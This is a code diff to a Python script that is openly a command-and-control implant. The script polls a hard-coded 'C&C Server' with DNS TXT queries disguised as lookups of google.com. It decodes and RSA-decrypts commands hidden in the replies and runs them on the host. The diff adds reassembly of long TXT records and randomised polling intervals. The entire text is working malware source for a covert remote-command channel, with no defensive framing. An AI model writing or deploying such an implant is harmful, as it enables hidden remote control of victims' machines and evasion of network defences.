@@ -1,21 +1,21 @@
 #! /usr/bin/env python2.7
 
-import multiprocessing, os
+import multiprocessing, os, base64
 import random
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.primitives.asymmetric import padding
 
+DOMAIN_NAME = 'google.com'
 CCIP = '10.4.18.65'  # C&C Server
 QUERY_DELAY = 10  # In seconds
-DOMAIN_NAME = 'google.com'  # Fake domain name query
 
 lastcommand = ''  # The previous command received
 
 
 # Read the private key in
-# Source: https://nitratine.net/blog/post/asymmetric-encryption-and-decryption-in-python/
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import serialization
 with open("private_key.pem", "rb") as key_file:
     private_key = serialization.load_pem_private_key(
         key_file.read(),
@@ -52,9 +52,22 @@ def getcommand(scapy_pkt):
     global lastcommand
 
     # Get command text
-    command = str(scapy_pkt[DNS].an.rdata)[1:]
-    command = decrypt_command(command.decode('base64'))
-    print('[!] Command: ' + str(command))
+    command = ''
+    rdata = str(scapy_pkt[DNS].an.rdata)
+    rdatalen = len(rdata)
+    i = 0
+    # TXT string max length is 255, remove STRING_START characters
+    while i < rdatalen:
+        if i + 256 <= rdatalen:
+            command += rdata[i + 1: i + 256]
+        else:
+            command += rdata[i + 1:]
+        i += 256
+
+    print('[!] Encrypted and encoded command: ' + str(command))
+    decode_com = base64.b64decode(command)
+    command = decrypt_command(decode_com)
+    print('[!] Plaintext command: ' + str(command))
 
     if command != lastcommand:
         # Run command on system
@@ -75,12 +88,10 @@ def decrypt_command(encrypted):
         )
     )
 
-    return originalcommand
+    return original_command
 
 
 nfqueue = NetfilterQueue()
-
-
 def run_nfqueue():
     try:
         print('[*] NFQUEUE running')
@@ -100,9 +111,9 @@ if __name__ == "__main__":
 
     while(True):
         try:
-            print('[+] Sending DNS query: ' + DOMAIN_NAME)
             os.system('nslookup -q=txt ' + DOMAIN_NAME + ' ' + CCIP + ' > /dev/null')
-            time.sleep(int(random.uniform(-0.25, 0.25) * QUERY_DELAY))
+            print('[+] Sent DNS query: ' + DOMAIN_NAME)
+            time.sleep(random.uniform(0.75, 1.25) * QUERY_DELAY)
         except KeyboardInterrupt:
             break
     
